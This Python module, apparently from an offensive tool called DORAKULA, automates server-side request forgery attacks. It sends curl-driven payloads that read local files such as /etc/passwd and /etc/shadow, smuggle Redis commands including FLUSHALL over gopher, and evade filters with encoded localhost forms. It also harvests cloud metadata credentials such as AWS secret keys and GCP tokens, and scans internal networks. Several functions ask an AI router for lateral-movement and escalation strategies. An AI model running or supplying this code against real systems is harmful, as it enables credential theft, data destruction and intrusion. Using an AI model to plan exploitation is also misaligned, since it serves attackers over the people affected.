#!/usr/bin/env python3
"""DORAKULA SSRF Tester - Server-Side Request Forgery Detection & Exploitation

Comprehensive SSRF testing module covering cloud metadata extraction,
internal network scanning, protocol smuggling, and AI-enhanced bypass
payload generation.
"""

import asyncio
import json
import logging
import re
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, urlencode, quote

logger = logging.getLogger(__name__)


class SSRFTester:
    """Advanced SSRF vulnerability tester with cloud metadata and internal scanning.

    Tests for Server-Side Request Forgery across multiple protocols (http,
    file, gopher, dict), extracts cloud metadata credentials, performs
    internal network pivoting, and generates AI-enhanced bypass payloads.

    Attributes:
        ai_router: AI router instance for intelligent payload generation.
        timeout: Default timeout for HTTP requests in seconds.
    """

    # Cloud metadata endpoints
    CLOUD_METADATA: Dict[str, Dict[str, Any]] = {
        "aws": {
            "url": "http://169.254.169.254/latest/meta-data/",
            "iam_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "token_url": "http://169.254.169.254/latest/api/token",
            "headers": {},
            "description": "AWS EC2 Instance Metadata Service (IMDSv1)",
        },
        "aws_v2": {
            "url": "http://169.254.169.254/latest/meta-data/",
            "iam_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "token_url": "http://169.254.169.254/latest/api/token",
            "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            "description": "AWS EC2 IMDSv2 (requires PUT for token)",
        },
        "gcp": {
            "url": "http://metadata.google.internal/computeMetadata/v1/",
            "headers": {"Metadata-Flavor": "Google"},
            "service_accounts": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "description": "GCP Compute Engine Metadata",
        },
        "azure": {
            "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "headers": {"Metadata": "true", "Accept": "application/json"},
            "description": "Azure Instance Metadata Service (IMDS)",
        },
        "digitalocean": {
            "url": "http://169.254.169.254/metadata/v1/",
            "headers": {},
            "description": "DigitalOcean Droplet Metadata",
        },
        "packet": {
            "url": "https://metadata.packet.net/",
            "headers": {},
            "description": "Packet/Equinix Metal Metadata",
        },
        "alibaba": {
            "url": "http://100.100.100.200/latest/meta-data/",
            "headers": {},
            "description": "Alibaba Cloud ECS Metadata",
        },
    }

    # SSRF protocol payloads
    PROTOCOL_PAYLOADS: List[Dict[str, str]] = [
        {"protocol": "http", "payload": "http://127.0.0.1", "description": "Localhost HTTP"},
        {"protocol": "http", "payload": "http://localhost", "description": "Localhost by name"},
        {"protocol": "http", "payload": "http://[::1]", "description": "IPv6 localhost"},
        {"protocol": "http", "payload": "http://0.0.0.0", "description": "Zero address"},
        {"protocol": "http", "payload": "http://0x7f000001", "description": "Hex localhost"},
        {"protocol": "http", "payload": "http://2130706433", "description": "Decimal localhost"},
        {"protocol": "http", "payload": "http://0177.0.0.1", "description": "Octal localhost"},
        {"protocol": "http", "payload": "http://127.1", "description": "Short localhost"},
        {"protocol": "http", "payload": "http://127.0.0.1:22", "description": "SSH port probe"},
        {"protocol": "http", "payload": "http://127.0.0.1:3306", "description": "MySQL port probe"},
        {"protocol": "file", "payload": "file:///etc/passwd", "description": "Local file read"},
        {"protocol": "file", "payload": "file:///etc/hosts", "description": "Hosts file read"},
        {"protocol": "file", "payload": "file:///proc/self/environ", "description": "Process env vars"},
        {"protocol": "file", "payload": "file:///proc/self/cmdline", "description": "Process cmdline"},
        {"protocol": "gopher", "payload": "gopher://127.0.0.1:6379/_PING", "description": "Redis PING"},
        {"protocol": "gopher", "payload": "gopher://127.0.0.1:25/_HELO%20test", "description": "SMTP HELO"},
        {"protocol": "dict", "payload": "dict://127.0.0.1:11211/stats", "description": "Memcached stats"},
    ]

    def __init__(self, ai_router: Any = None, timeout: int = 30):
        """Initialize SSRFTester.

        Args:
            ai_router: AIRouter instance for AI-enhanced operations.
            timeout: Default request timeout in seconds.
        """
        self.ai_router = ai_router
        self.timeout = timeout
        logger.info("SSRFTester initialized with timeout=%d", timeout)

    async def test_ssrf(self, target: str, parameters: List[str]) -> Dict[str, Any]:
        """Test SSRF on specified parameters of the target URL.

        Injects SSRF payloads into each specified parameter, testing multiple
        protocols and localhost bypass techniques. Monitors response for
        indicators of successful SSRF.

        Args:
            target: Target URL with injectable parameters.
            parameters: List of parameter names to test.

        Returns:
            Dictionary containing:
                - findings: List of confirmed SSRF findings
                - potential: List of potential SSRF indicators
                - tested_parameters: Parameters that were tested
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "target": target,
            "findings": [],
            "potential": [],
            "tested_parameters": [],
            "errors": [],
        }

        # SSRF detection indicators
        ssrf_indicators: List[str] = [
            "root:x:", "nobody:", "daemon:",          # /etc/passwd content
            "ami-id", "instance-id", "instance-type",  # AWS metadata
            "service-accounts", "accessKey",           # Cloud credentials
            "meta-data", "user-data",                  # Cloud metadata
            "PING", "PONG",                            # Redis
            "STAT", "stats",                           # Memcached
            "220 ", "250 ", "354 ",                    # SMTP
            "SSH-2.0",                                 # SSH
            "mysql", "MariaDB",                        # MySQL
            "index of", "directory listing",           # Directory listing
        ]

        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param in parameters:
            param_results: Dict[str, Any] = {
                "parameter": param,
                "payload_results": [],
            }

            for payload_info in self.PROTOCOL_PAYLOADS:
                try:
                    inject_url = f"{base_url}?{param}={quote(payload_info['payload'], safe='')}"
                    cmd = [
                        "curl", "-s",
                        "-o", "/dev/null",
                        "-w", "%{http_code}|%{size_download}|%{time_total}",
                        "--max-time", str(self.timeout),
                        "-L",
                        inject_url,
                    ]
                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await asyncio.wait_for(
                        proc.communicate(), timeout=self.timeout + 5
                    )
                    metrics = stdout.decode("utf-8", errors="replace").strip()

                    # Also get response body for content analysis
                    cmd_body = [
                        "curl", "-s",
                        "--max-time", str(self.timeout),
                        "-L",
                        inject_url,
                    ]
                    proc_body = await asyncio.create_subprocess_exec(
                        *cmd_body,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    body_stdout, _ = await asyncio.wait_for(
                        proc_body.communicate(), timeout=self.timeout + 5
                    )
                    response_body = body_stdout.decode("utf-8", errors="replace")

                    # Analyze response for SSRF indicators
                    found_indicators = []
                    for indicator in ssrf_indicators:
                        if indicator.lower() in response_body.lower():
                            found_indicators.append(indicator)

                    entry = {
                        "payload": payload_info["payload"],
                        "protocol": payload_info["protocol"],
                        "description": payload_info["description"],
                        "metrics": metrics,
                        "indicators": found_indicators,
                        "response_length": len(response_body),
                    }

                    if found_indicators:
                        entry["status"] = "confirmed_ssrf"
                        results["findings"].append({
                            "parameter": param,
                            **entry,
                        })
                    elif "0|" not in metrics and len(response_body) > 0:
                        entry["status"] = "potential_ssrf"
                        results["potential"].append({
                            "parameter": param,
                            **entry,
                        })
                    else:
                        entry["status"] = "no_indicators"

                    param_results["payload_results"].append(entry)

                except asyncio.TimeoutError:
                    results["errors"].append(
                        f"Timeout testing {param} with {payload_info['description']}"
                    )
                except OSError as exc:
                    results["errors"].append(
                        f"Error testing {param}: {exc}"
                    )

            results["tested_parameters"].append(param_results)

        # AI analysis
        if self.ai_router and (results["findings"] or results["potential"]):
            try:
                ai_result = await self.ai_router.query(
                    f"Analyze these SSRF test results and suggest next exploitation steps:\n"
                    f"Confirmed: {json.dumps(results['findings'][:5], indent=2)}\n"
                    f"Potential: {json.dumps(results['potential'][:5], indent=2)}",
                    context="ssrf_analysis"
                )
                results["ai_analysis"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI SSRF analysis failed: %s", exc)

        logger.info("SSRF test complete: %d confirmed, %d potential",
                     len(results["findings"]), len(results["potential"]))
        return results

    async def test_cloud_metadata(self, target: str) -> Dict[str, Any]:
        """Test cloud metadata endpoint access via SSRF.

        Attempts to access AWS, GCP, Azure, DigitalOcean, and Alibaba
        Cloud metadata endpoints through the target SSRF vector.

        Args:
            target: Target URL with SSRF vulnerability.

        Returns:
            Dictionary containing:
                - cloud_findings: Metadata extraction results per provider
                - credentials: Any extracted credentials
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "target": target,
            "cloud_findings": [],
            "credentials": [],
            "errors": [],
        }

        for provider, meta in self.CLOUD_METADATA.items():
            try:
                metadata_url = meta["url"]
                headers = meta.get("headers", {})

                # Build curl command with appropriate headers
                cmd = ["curl", "-s", "--max-time", str(self.timeout), "-L"]
                for key, value in headers.items():
                    cmd.extend(["-H", f"{key}: {value}"])

                # Test via SSRF - inject metadata URL as parameter
                parsed = urlparse(target)
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

                # Try common SSRF parameter names
                for param in ["url", "uri", "path", "dest", "redirect", "return", "next", "img", "fetch"]:
                    inject_url = f"{base_url}?{param}={quote(metadata_url, safe='')}"
                    test_cmd = cmd + [inject_url]

                    proc = await asyncio.create_subprocess_exec(
                        *test_cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await asyncio.wait_for(
                        proc.communicate(), timeout=self.timeout + 5
                    )
                    response = stdout.decode("utf-8", errors="replace")

                    # Check for metadata indicators
                    finding: Dict[str, Any] = {
                        "provider": provider,
                        "description": meta["description"],
                        "parameter": param,
                        "metadata_url": metadata_url,
                        "response_length": len(response),
                        "indicators": [],
                    }

                    provider_indicators: Dict[str, List[str]] = {
                        "aws": ["ami-id", "instance-id", "instance-type", "reservation-id",
                                "iam", "security-credentials", "accessKeyId"],
                        "aws_v2": ["ami-id", "instance-id", "iam", "accessKeyId"],
                        "gcp": ["projects/", "instances/", "service-accounts", "access_token"],
                        "azure": ["location", "name", "resourceGroupName", "subscriptionId"],
                        "digitalocean": ["droplet_id", "hostname", "interfaces"],
                        "packet": ["hostname", "iqn", "network"],
                        "alibaba": ["instance-id", "eipv4", "hostname"],
                    }

                    for indicator in provider_indicators.get(provider, []):
                        if indicator.lower() in response.lower():
                            finding["indicators"].append(indicator)

                    if finding["indicators"]:
                        finding["status"] = "metadata_accessed"
                        finding["response_snippet"] = response[:2000]
                        results["cloud_findings"].append(finding)

                        # Check for credential leakage
                        cred_patterns = [
                            r'"AccessKeyId"\s*:\s*"([A-Z0-9]+)"',
                            r'"SecretAccessKey"\s*:\s*"([A-Za-z0-9/+=]+)"',
                            r'"access_token"\s*:\s*"([^"]+)"',
                            r'"Token"\s*:\s*"([^"]+)"',
                            r'"primaryKey"\s*:\s*"([^"]+)"',
                        ]
                        for pattern in cred_patterns:
                            matches = re.findall(pattern, response)
                            if matches:
                                results["credentials"].append({
                                    "provider": provider,
                                    "type": pattern.split('"')[1],
                                    "found": True,
                                    "parameter": param,
                                })

                        # Only need one working parameter per provider
                        break

                    # Check if we got a meaningful response at all
                    if len(response) > 50 and provider in ("aws", "gcp", "azure"):
                        finding["status"] = "potential_access"
                        finding["response_snippet"] = response[:500]
                        results["cloud_findings"].append(finding)
                        break

            except asyncio.TimeoutError:
                results["errors"].append(f"Timeout testing {provider} metadata")
            except OSError as exc:
                results["errors"].append(f"Error testing {provider}: {exc}")

        if self.ai_router and results["credentials"]:
            try:
                ai_result = await self.ai_router.query(
                    f"Cloud credentials found via SSRF! Analyze impact and "
                    f"escalation paths:\n{json.dumps(results['credentials'], indent=2)}",
                    context="ssrf_credential_analysis"
                )
                results["ai_escalation"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI credential analysis failed: %s", exc)

        logger.info("Cloud metadata test: %d findings, %d credentials",
                     len(results["cloud_findings"]), len(results["credentials"]))
        return results

    async def test_internal_scan(self, target: str, ip_range: str) -> Dict[str, Any]:
        """Perform internal network scanning via SSRF.

        Uses the SSRF vulnerability to scan internal IP ranges for
        live hosts and open services.

        Args:
            target: Target URL with SSRF vulnerability.
            ip_range: IP range to scan (e.g., '10.0.0.0/24', '192.168.1.1-50').

        Returns:
            Dictionary containing:
                - live_hosts: List of responsive internal hosts
                - open_ports: Discovered open ports/services
                - scan_range: The IP range scanned
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "target": target,
            "live_hosts": [],
            "open_ports": [],
            "scan_range": ip_range,
            "errors": [],
        }

        # Parse IP range
        ips_to_scan: List[str] = []
        try:
            if "/" in ip_range:
                # CIDR notation - parse /24 and smaller
                base = ip_range.split("/")[0]
                prefix = int(ip_range.split("/")[1])
                if prefix < 16 or prefix > 30:
                    results["errors"].append(
                        f"Prefix /{prefix} out of safe scan range (16-30)"
                    )
                    return results
                parts = base.split(".")
                if prefix == 24:
                    for i in range(1, 255):
                        ips_to_scan.append(f"{parts[0]}.{parts[1]}.{parts[2]}.{i}")
                elif prefix == 16:
                    for j in range(1, 5):
                        for i in range(1, 255):
                            ips_to_scan.append(f"{parts[0]}.{parts[1]}.{j}.{i}")
                            if len(ips_to_scan) >= 100:
                                break
            elif "-" in ip_range:
                # Range notation: 192.168.1.1-50
                parts = ip_range.rsplit(".", 1)
                base = parts[0]
                range_part = parts[1]
                if "-" in range_part:
                    start, end = range_part.split("-")
                    for i in range(int(start), int(end) + 1):
                        ips_to_scan.append(f"{base}.{i}")
            else:
                ips_to_scan = [ip_range]
        except (ValueError, IndexError) as exc:
            results["errors"].append(f"Invalid IP range '{ip_range}': {exc}")
            return results

        common_ports: List[int] = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 27017]

        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        ssrf_param = "url"

        # Scan for live hosts
        async def _probe_ip(ip: str) -> Optional[Dict[str, Any]]:
            """Probe a single IP via SSRF."""
            try:
                inject_url = f"{base_url}?{ssrf_param}={quote(f'http://{ip}', safe='')}"
                cmd = [
                    "curl", "-s",
                    "-o", "/dev/null",
                    "-w", "%{http_code}|%{time_total}",
                    "--max-time", "5",
                    "--connect-timeout", "3",
                    inject_url,
                ]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(
                    proc.communicate(), timeout=8
                )
                metrics = stdout.decode("utf-8", errors="replace").strip()
                parts = metrics.split("|")
                if len(parts) >= 2:
                    code = parts[0]
                    time_total = float(parts[1]) if parts[1] else 0
                    if code != "000" and time_total < 4.5:
                        return {
                            "ip": ip,
                            "http_code": code,
                            "response_time": time_total,
                        }
            except asyncio.TimeoutError:
                pass
            except (OSError, ValueError):
                pass
            return None

        # Limit concurrent scans
        semaphore = asyncio.Semaphore(10)

        async def _limited_probe(ip: str) -> Optional[Dict[str, Any]]:
            async with semaphore:
                return await _probe_ip(ip)

        probe_tasks = [_limited_probe(ip) for ip in ips_to_scan[:50]]
        probe_results = await asyncio.gather(*probe_tasks, return_exceptions=True)

        for result in probe_results:
            if isinstance(result, dict):
                results["live_hosts"].append(result)
                # Port scan live hosts
                for port in common_ports:
                    try:
                        inject_url = f"{base_url}?{ssrf_param}={quote(f'http://{result["ip"]}:{port}', safe='')}"
                        cmd = [
                            "curl", "-s",
                            "-o", "/dev/null",
                            "-w", "%{http_code}|%{time_total}",
                            "--max-time", "5",
                            "--connect-timeout", "3",
                            inject_url,
                        ]
                        proc = await asyncio.create_subprocess_exec(
                            *cmd,
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                        )
                        stdout, _ = await asyncio.wait_for(
                            proc.communicate(), timeout=8
                        )
                        metrics = stdout.decode("utf-8", errors="replace").strip()
                        parts = metrics.split("|")
                        if len(parts) >= 2 and parts[0] != "000":
                            results["open_ports"].append({
                                "ip": result["ip"],
                                "port": port,
                                "http_code": parts[0],
                            })
                    except asyncio.TimeoutError:
                        pass
                    except OSError:
                        pass

        if self.ai_router and results["live_hosts"]:
            try:
                ai_result = await self.ai_router.query(
                    f"Internal network discovered via SSRF. Suggest lateral movement "
                    f"and exploitation strategies:\n"
                    f"Live hosts: {json.dumps(results['live_hosts'][:10], indent=2)}\n"
                    f"Open ports: {json.dumps(results['open_ports'][:10], indent=2)}",
                    context="ssrf_lateral_movement"
                )
                results["ai_lateral_movement"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI lateral movement analysis failed: %s", exc)

        logger.info("Internal scan complete: %d live hosts, %d open ports",
                     len(results["live_hosts"]), len(results["open_ports"]))
        return results

    async def generate_payloads(self, target: str) -> Dict[str, Any]:
        """Generate AI-enhanced SSRF bypass payloads.

        Creates a comprehensive list of SSRF payloads with bypass techniques
        for common WAF and filter evasion.

        Args:
            target: Target URL for context-aware payload generation.

        Returns:
            Dictionary containing:
                - payloads: List of SSRF payloads with metadata
                - bypass_categories: Categories of bypass techniques used
                - ai_payloads: AI-generated payloads
        """
        payloads: List[Dict[str, Any]] = []

        # Localhost bypass payloads
        localhost_bypasses: List[Dict[str, str]] = [
            {"payload": "http://127.0.0.1", "category": "localhost_direct", "description": "Direct localhost IP"},
            {"payload": "http://localhost", "category": "localhost_direct", "description": "Localhost hostname"},
            {"payload": "http://[::1]", "category": "localhost_ipv6", "description": "IPv6 localhost"},
            {"payload": "http://[::ffff:127.0.0.1]", "category": "localhost_ipv6", "description": "IPv6-mapped localhost"},
            {"payload": "http://0.0.0.0", "category": "localhost_zero", "description": "Zero address"},
            {"payload": "http://0x7f000001", "category": "localhost_hex", "description": "Hex-encoded localhost"},
            {"payload": "http://2130706433", "category": "localhost_decimal", "description": "Decimal localhost"},
            {"payload": "http://0177.0.0.01", "category": "localhost_octal", "description": "Octal localhost"},
            {"payload": "http://0177.0.0.1", "category": "localhost_octal", "description": "Partial octal localhost"},
            {"payload": "http://127.1", "category": "localhost_short", "description": "Short-form localhost"},
            {"payload": "http://127.0.1", "category": "localhost_short", "description": "Alternative short localhost"},
            {"payload": "http://0", "category": "localhost_zero", "description": "Single zero"},
        ]

        # URL encoding bypasses
        encoding_bypasses: List[Dict[str, str]] = [
            {"payload": "http://%31%32%37%2e%30%2e%30%2e%31", "category": "url_encoding", "description": "URL-encoded localhost"},
            {"payload": "http://127.0.0.1%23@example.com", "category": "fragment_bypass", "description": "Fragment trick"},
            {"payload": "http://example.com@127.0.0.1", "category": "authority_bypass", "description": "Authority component bypass"},
            {"payload": "http://127.0.0.1:80@example.com", "category": "port_bypass", "description": "Port-based bypass"},
            {"payload": "http://127。0。0。1", "category": "unicode_bypass", "description": "Unicode dot bypass"},
        ]

        # Protocol smuggling
        protocol_payloads: List[Dict[str, str]] = [
            {"payload": "file:///etc/passwd", "category": "file_protocol", "description": "Local file read"},
            {"payload": "file:///etc/shadow", "category": "file_protocol", "description": "Shadow file read"},
            {"payload": "file:///proc/self/environ", "category": "file_protocol", "description": "Process environment"},
            {"payload": "gopher://127.0.0.1:6379/_INFO", "category": "gopher_protocol", "description": "Redis INFO"},
            {"payload": "gopher://127.0.0.1:6379/_FLUSHALL", "category": "gopher_protocol", "description": "Redis FLUSHALL"},
            {"payload": "dict://127.0.0.1:11211/stats", "category": "dict_protocol", "description": "Memcached stats"},
            {"payload": "ftp://127.0.0.1:21/", "category": "ftp_protocol", "description": "FTP banner grab"},
        ]

        # DNS rebinding payloads
        dns_payloads: List[Dict[str, str]] = [
            {"payload": "http://make-127-0-0-1-rr.1u.ms", "category": "dns_rebinding", "description": "DNS rebinding to localhost"},
            {"payload": "http://spoofed.burpcollaborator.net", "category": "dns_rebinding", "description": "Burp Collaborator DNS"},
        ]

        # Open redirect chains
        redirect_payloads: List[Dict[str, str]] = [
            {"payload": "https://www.google.com/translate?u=http://127.0.0.1", "category": "open_redirect", "description": "Google translate redirect"},
            {"payload": "https://tinyurl.com/REDIRECT_ID", "category": "url_shortener", "description": "URL shortener redirect"},
        ]

        payloads.extend(localhost_bypasses)
        payloads.extend(encoding_bypasses)
        payloads.extend(protocol_payloads)
        payloads.extend(dns_payloads)
        payloads.extend(redirect_payloads)

        # AI enhancement
        ai_payloads: List[Dict[str, str]] = []
        if self.ai_router:
            try:
                ai_result = await self.ai_router.query(
                    f"Generate 15 advanced SSRF bypass payloads for target {target}. "
                    f"Include: DNS rebinding techniques, IP obfuscation methods, "
                    f"protocol smuggling beyond http/file/gopher/dict, "
                    f"and cloud-specific metadata bypass techniques. "
                    f"Format: one payload per line with brief description.",
                    context="ssrf_payload_generation"
                )
                if ai_result:
                    for line in ai_result.splitlines():
                        line = line.strip()
                        if line and not line.startswith("#") and len(line) < 500:
                            ai_payloads.append({
                                "payload": line,
                                "category": "ai_generated",
                                "description": "AI-generated SSRF bypass",
                            })
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI SSRF payload generation failed: %s", exc)

        categories = list(set(p["category"] for p in payloads))

        result: Dict[str, Any] = {
            "target": target,
            "payloads": payloads,
            "ai_payloads": ai_payloads,
            "bypass_categories": categories,
            "total_count": len(payloads) + len(ai_payloads),
        }

        logger.info("Generated %d SSRF payloads across %d categories",
                     result["total_count"], len(categories))
        return result
